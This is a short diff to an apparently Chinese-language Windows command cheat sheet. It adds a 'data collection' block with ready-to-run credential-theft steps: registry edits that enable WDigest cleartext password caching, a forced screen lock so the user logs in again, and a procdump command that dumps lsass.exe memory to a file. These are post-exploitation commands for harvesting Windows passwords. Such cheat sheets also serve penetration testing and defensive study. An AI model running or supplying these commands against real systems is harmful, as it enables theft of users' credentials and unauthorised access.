@@ -134,6 +134,16 @@ taskkill /pid num                          //结束进程            </f强行�
 ipconfig /flushdns                         //清除本地DNS缓存
 ```
 
+- 数据收集
+
+```
+# 修改注册表开启/关闭Wdigest Auth
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
+rundll32 user32.dll,LockWorkStation                         # 强制锁屏,使其重新登录
+procdump.exe -accepteula -ma lsass.exe lsass.dmp            # 导出内存文件lsass.dmp
+```
+
 ## Tools
 
 - MySQL
